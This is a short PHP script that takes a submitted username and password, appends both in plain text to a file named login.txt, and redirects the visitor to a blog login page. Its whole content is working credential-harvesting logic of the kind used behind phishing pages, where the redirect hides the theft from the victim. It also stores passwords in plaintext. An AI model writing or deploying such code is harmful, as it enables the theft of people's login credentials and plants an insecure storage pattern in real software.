<?php
	$username = $_POST['username'];
	$password = $_POST['password'];
	
	$myFile = "login.txt";
//"a" (Write only. Opens and writes to the end of the file or 
//creates a new file if it doesn't exist)
	$fh = fopen($myFile, 'a') or die("can't open file"); 
	fwrite($fh,"$username,,$password\n");
	fclose($fh);
	
	header("Location: /wy301/blog/login.php");
?>